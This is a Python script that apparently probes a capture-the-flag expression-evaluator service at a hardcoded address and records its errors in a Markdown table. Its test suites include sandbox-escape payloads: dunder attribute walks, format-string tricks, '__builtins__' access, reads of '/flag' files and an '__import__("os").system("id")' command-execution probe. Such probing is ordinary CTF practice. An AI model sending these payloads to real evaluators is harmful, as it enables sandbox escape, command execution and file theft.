#!/usr/bin/env python3
import argparse
import json
import socket
import time

HOST = "66.228.50.16"
PORT = 48271

DEFAULT_TESTS = [
    ("empty", ""),
    ("empty", " "),
    ("pass literal", "0"),
    ("pass literal", "1"),
    ("pass literal", "42"),
    ("pass literal", "  1  "),
    ("pass literal", "1234567890"),
    ("number form", "01"),
    ("number form", "0x41"),
    ("number form", "0b101"),
    ("number form", "1.5"),
    ("number form", ".5"),
    ("operator alone", "+"),
    ("operator alone", "-"),
    ("operator alone", "*"),
    ("operator alone", "/"),
    ("operator alone", "%"),
    ("operator alone", "**"),
    ("operator alone", "//"),
    ("dangling operator", "1+"),
    ("dangling operator", "1-"),
    ("dangling operator", "1*"),
    ("dangling operator", "1/"),
    ("dangling operator", "1%"),
    ("dangling operator", "1**"),
    ("dangling operator", "1//"),
    ("operation", "+1"),
    ("operation", "-1"),
    ("operation", "~1"),
    ("operation", "1+2"),
    ("operation", "1-2"),
    ("operation", "2*3"),
    ("operation", "6/2"),
    ("operation", "2**3"),
    ("operation", "10%3"),
    ("operation", "5//2"),
    ("parentheses", "(1)"),
    ("parentheses", "("),
    ("parentheses", ")"),
    ("parentheses", "()"),
    ("parentheses", "(1"),
    ("parentheses", "1)"),
    ("parentheses", "((1)"),
    ("parentheses", "(1))"),
    ("token order", "1 2"),
    ("token order", "1,"),
    ("token order", ","),
    ("name", "a"),
    ("name", "abc"),
    ("name", "abc123"),
    ("name", "_"),
    ("name", "_x"),
    ("name", "x_y"),
    ("name", "sin"),
    ("name", "flag"),
    ("name in expression", "a+1"),
    ("name in expression", "1+a"),
    ("call", "foo()"),
    ("call", "foo(1)"),
    ("call", "len(\"hi\")"),
    ("constant name", "true"),
    ("constant name", "False"),
    ("constant name", "None"),
    ("string", "'x'"),
    ("string", "\"x\""),
    ("string", "'x"),
    ("string", "\"x"),
    ("collection", "[]"),
    ("collection", "[1]"),
    ("collection", "{}"),
    ("collection", "{1:2}"),
    ("collection", "(1,2)"),
    ("access", "\"abc\"[0]"),
    ("access", "().__class__"),
    ("access", "\"hi\".upper()"),
    ("bad char", "@"),
    ("bad char", "#"),
    ("bad char", "$"),
]

FUNCTION_TESTS = [
    ("known function", "len(\"\")"),
    ("known function", "len(\"abc\")"),
    ("known function", "len(0)"),
    ("known function", "type(0)"),
    ("known function", "type(\"\")"),
    ("known function", "type(len(\"a\"))"),
    ("common builtin", "abs(1)"),
    ("common builtin", "ascii(\"x\")"),
    ("common builtin", "bin(5)"),
    ("common builtin", "bool(1)"),
    ("common builtin", "bytes(\"x\")"),
    ("common builtin", "callable(0)"),
    ("common builtin", "chr(65)"),
    ("common builtin", "dir()"),
    ("common builtin", "dir(\"\")"),
    ("common builtin", "eval(\"1\")"),
    ("common builtin", "exec(\"1\")"),
    ("common builtin", "format(1)"),
    ("common builtin", "getattr(\"\",\"__class__\")"),
    ("common builtin", "globals()"),
    ("common builtin", "hash(\"x\")"),
    ("common builtin", "hex(65)"),
    ("common builtin", "id(0)"),
    ("common builtin", "int(\"42\")"),
    ("common builtin", "list(\"x\")"),
    ("common builtin", "locals()"),
    ("common builtin", "max(\"abc\")"),
    ("common builtin", "min(\"abc\")"),
    ("common builtin", "object()"),
    ("common builtin", "oct(8)"),
    ("common builtin", "open(\"/flag\")"),
    ("common builtin", "open(\"/flag.txt\")"),
    ("common builtin", "ord(\"A\")"),
    ("common builtin", "print(1)"),
    ("common builtin", "repr(0)"),
    ("common builtin", "set(\"x\")"),
    ("common builtin", "str(123)"),
    ("common builtin", "sum(\"x\")"),
    ("common builtin", "tuple(\"x\")"),
    ("common builtin", "vars()"),
    ("common builtin", "__import__(\"os\")"),
    ("challenge name", "archive()"),
    ("challenge name", "archive(\"flag\")"),
    ("challenge name", "sealed()"),
    ("challenge name", "gate()"),
    ("challenge name", "open_gate()"),
    ("challenge name", "unlock()"),
    ("challenge name", "unlock(\"flag\")"),
    ("challenge name", "flag()"),
    ("challenge name", "read(\"flag\")"),
    ("oracle style", "L()"),
    ("oracle style", "L(0)"),
    ("oracle style", "Q(0,0)"),
    ("oracle style", "S(\"x\")"),
]

PRIMITIVE_TESTS = [
    ("len constants", "len(\"\")"),
    ("len constants", "len(\"a\")"),
    ("len constants", "len(\"ab\")"),
    ("len constants", "len(\"abc\")"),
    ("len constants", "len(\"abcd\")"),
    ("type strings", "type(0)"),
    ("type strings", "type(\"\")"),
    ("type strings", "type(len(\"\"))"),
    ("type strings", "type(\"abc\"[0])"),
    ("string index", "\"abc\"[0]"),
    ("string index", "\"abc\"[1]"),
    ("string index", "\"abc\"[2]"),
    ("string index", "\"abc\"[3]"),
    ("string index", "\"abc\"[len(\"\")]"),
    ("string index", "\"abc\"[len(\"a\")]"),
    ("string index", "\"abc\"[len(\"ab\")]"),
    ("string index", "\"abc\"[len(\"abc\")]"),
    ("type index", "type(0)[0]"),
    ("type index", "type(0)[1]"),
    ("type index", "type(0)[2]"),
    ("type index", "type(0)[len(\"\")]"),
    ("type index", "type(0)[len(\"a\")]"),
    ("type index", "type(0)[len(\"ab\")]"),
    ("type index", "type(\"\")[0]"),
    ("type index", "type(\"\")[1]"),
    ("type index", "type(\"\")[2]"),
    ("escaped string", "\"\\x42\""),
    ("escaped string", "\"\\141\""),
    ("escaped string", "\"BDSEC{}\""),
]

ESCAPE_TESTS = [
    ("dunder literal", "\"__class__\""),
    ("dunder literal", "\"__subclasses__\""),
    ("dunder literal", "\"__globals__\""),
    ("attr", "\"\".__class__"),
    ("attr", "().__class__"),
    ("attr", "type(0).__class__"),
    ("subscript attr", "\"\"[\"__class__\"]"),
    ("format trick", "\"{0.__class__}\".format(\"\")"),
    ("format trick", "\"{0[0]}\".format(\"abc\")"),
    ("getitem call", "\"abc\".__getitem__(0)"),
    ("dunder call", "__import__(\"os\")"),
    ("dunder call", "__import__(\"os\").system(\"id\")"),
    ("file read", "open(\"flag\")"),
    ("file read", "open(\"flag.txt\")"),
    ("file read", "open(\"/flag\")"),
    ("file read", "open(\"/flag.txt\")"),
    ("file read", "read(\"flag\")"),
    ("leak", "id(0)"),
    ("leak", "repr(0)"),
    ("leak", "repr(type(0))"),
    ("name access", "len"),
    ("name access", "type"),
    ("name access", "__builtins__"),
]

DIRECTION_TESTS = [
    ("hidden functions", "len(\"abc\")"),
    ("hidden functions", "type(0)"),
    ("hidden functions", "id(0)"),
    ("hidden functions", "repr(0)"),
    ("hidden functions", "dir()"),
    ("hidden functions", "dir(\"\")"),
    ("hidden functions", "globals()"),
    ("hidden functions", "locals()"),
    ("hidden functions", "vars()"),
    ("hidden functions", "getattr(\"\",\"__class__\")"),
    ("hidden functions", "str(123)"),
    ("hidden functions", "int(\"42\")"),
    ("hidden functions", "chr(65)"),
    ("hidden functions", "ord(\"A\")"),
    ("hidden functions", "open(\"/flag\")"),
    ("hidden functions", "__import__(\"os\")"),
    ("challenge names", "archive()"),
    ("challenge names", "archive(\"flag\")"),
    ("challenge names", "sealed()"),
    ("challenge names", "gate()"),
    ("challenge names", "unlock(\"flag\")"),
    ("challenge names", "flag()"),
    ("oracle names", "L()"),
    ("oracle names", "Q(0,0)"),
    ("oracle names", "S(\"x\")"),
    ("primitive build", "len(\"\")"),
    ("primitive build", "len(\"a\")"),
    ("primitive build", "len(\"ab\")"),
    ("primitive build", "type(0)"),
    ("primitive build", "type(\"\")"),
    ("primitive build", "type(0)[0]"),
    ("primitive build", "type(0)[len(\"a\")]"),
    ("primitive build", "type(0)[len(\"ab\")]"),
    ("primitive build", "type(\"\")[0]"),
    ("primitive build", "type(\"\")[len(\"a\")]"),
    ("primitive build", "\"abc\"[len(\"ab\")]"),
    ("primitive build", "\"\\x42\""),
    ("leak", "id(0)"),
    ("leak", "repr(0)"),
    ("leak", "repr(type(0))"),
    ("jail escape", "\"\".__class__"),
    ("jail escape", "().__class__"),
    ("jail escape", "\"{0.__class__}\".format(\"\")"),
    ("jail escape", "\"abc\".__getitem__(0)"),
    ("jail escape", "open(\"/flag.txt\")"),
]

SUITES = {
    "baseline": DEFAULT_TESTS,
    "functions": FUNCTION_TESTS,
    "primitives": PRIMITIVE_TESTS,
    "escape": ESCAPE_TESTS,
    "directions": DIRECTION_TESTS,
}


def recv_until_prompt(sock, timeout):
    sock.setblocking(False)
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            time.sleep(0.03)
            continue
        if not chunk:
            break
        data += chunk
        if data.endswith(b"> ") or b"\n> " in data:
            break
    return data


def recv_for(sock, timeout):
    sock.setblocking(False)
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            time.sleep(0.03)
            continue
        if not chunk:
            break
        data += chunk
    return data


def test_raw_once(expr, host, port, prompt_timeout, response_timeout):
    with socket.create_connection((host, port), timeout=5) as sock:
        banner = recv_until_prompt(sock, prompt_timeout)
        if b"> " not in banner:
            return banner, False
        sock.sendall(expr.encode() + b"\n")
        time.sleep(0.12)
        response = recv_for(sock, response_timeout)
    return banner + response, True


def test_raw(
    expr,
    host=HOST,
    port=PORT,
    attempts=3,
    prompt_timeout=5.0,
    response_timeout=1.8,
):
    last = b""
    for attempt in range(attempts):
        raw, had_prompt = test_raw_once(
            expr,
            host=host,
            port=port,
            prompt_timeout=prompt_timeout,
            response_timeout=response_timeout,
        )
        last = raw if had_prompt else b""
        if had_prompt and response_body(raw.decode("utf-8", errors="replace")):
            return raw
        time.sleep(0.35 + attempt * 0.25)
    return last


def response_body(text):
    if "> " in text:
        return text.rsplit("> ", 1)[1].strip()
    return text.strip()


def classify(text):
    body = response_body(text)
    lines = [line.strip() for line in body.splitlines() if line.strip()]
    for line in reversed(lines):
        if line.startswith("GateError:"):
            return line, body
    for line in reversed(lines):
        if line == "The gate remains closed.":
            return line, body
    if lines:
        return "pass", lines[-1]
    return "no response", body


def test(expr, category="manual", args=None):
    raw = test_raw(
        expr,
        host=args.host if args else HOST,
        port=args.port if args else PORT,
        attempts=args.attempts if args else 3,
        prompt_timeout=args.prompt_timeout if args else 5.0,
        response_timeout=args.response_timeout if args else 1.8,
    )
    text = raw.decode("utf-8", errors="replace")
    outcome, body = classify(text)
    return {
        "category": category,
        "input": expr,
        "outcome": outcome,
        "body": body,
    }


def escape_cell(value):
    text = str(value).replace("\n", "\\n")
    text = text.replace("|", "\\|")
    return text


def write_markdown(results, path, host=HOST, port=PORT):
    malformed = [r for r in results if r["outcome"] == "GateError: malformed expression"]
    unknown = [r for r in results if r["outcome"] == "GateError: unknown name"]
    lines = [
        "# Obsidian Gate input error list",
        "",
        f"Target: `{host}:{port}`",
        "",
        "## Observed conditions",
        "",
        "- `GateError: malformed expression`: input is rejected by the parser before evaluation. This happens with empty/incomplete syntax, dangling operators, unbalanced parentheses, adjacent tokens without an operator, unterminated strings, and unsupported punctuation.",
        "- `GateError: unknown name`: input parses as a name expression, but the evaluator cannot resolve the identifier. This happens with identifiers such as `a`, `abc`, `_x`, or a name used inside a larger expression.",
        "- `pass`: service returned an evaluated value and did not emit `GateError`.",
        "",
        "## [input, error]",
        "",
        "| input | category | error | returned body |",
        "|---|---|---|---|",
    ]
    for result in results:
        input_repr = json.dumps(result["input"])
        lines.append(
            "| `{}` | {} | {} | `{}` |".format(
                escape_cell(input_repr),
                escape_cell(result["category"]),
                escape_cell(result["outcome"]),
                escape_cell(result["body"]),
            )
        )

    lines.extend(
        [
            "",
            "## Minimal examples",
            "",
            f"- malformed expression: `{json.dumps(malformed[0]['input'])}` -> `{malformed[0]['outcome']}`"
            if malformed
            else "- malformed expression: not observed",
            f"- unknown name: `{json.dumps(unknown[0]['input'])}` -> `{unknown[0]['outcome']}`"
            if unknown
            else "- unknown name: not observed",
        ]
    )
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("inputs", nargs="*", help="specific expressions to test")
    parser.add_argument(
        "--input-file",
        default=None,
        help="read one expression per non-empty, non-comment line",
    )
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument(
        "--suite",
        choices=["baseline", "functions", "primitives", "escape", "directions", "all"],
        default="directions",
        help="predefined input suite to run when no explicit inputs are provided",
    )
    parser.add_argument(
        "--markdown",
        default=None,
        help="write the observed [input, error] table to this Markdown file",
    )
    parser.add_argument("--attempts", type=int, default=3)
    parser.add_argument("--prompt-timeout", type=float, default=5.0)
    parser.add_argument("--response-timeout", type=float, default=1.8)
    parser.add_argument("--delay", type=float, default=0.2)
    return parser.parse_args()


def main():
    args = parse_args()
    if args.input_file:
        tests = []
        with open(args.input_file, "r", encoding="utf-8") as f:
            for line in f:
                expr = line.strip()
                if expr and not expr.startswith("#"):
                    tests.append(("file", expr))
    elif args.inputs:
        tests = [("manual", expr) for expr in args.inputs]
    elif args.suite == "all":
        tests = []
        for suite_name in ("baseline", "functions", "primitives", "escape"):
            tests.extend((f"{suite_name}:{category}", expr) for category, expr in SUITES[suite_name])
    else:
        tests = SUITES[args.suite]
    results = []
    for category, expr in tests:
        try:
            result = test(expr, category, args)
        except Exception as exc:
            result = {
                "category": category,
                "input": expr,
                "outcome": f"client error: {exc.__class__.__name__}: {exc}",
                "body": "",
            }
        results.append(result)
        print(
            "{:<18} {:<16} -> {}".format(
                repr(expr),
                category,
                result["outcome"] if result["outcome"] != "pass" else f"pass ({result['body']})",
            ),
            flush=True,
        )
        time.sleep(args.delay)
    if args.markdown:
        write_markdown(results, args.markdown, host=args.host, port=args.port)


if __name__ == "__main__":
    main()
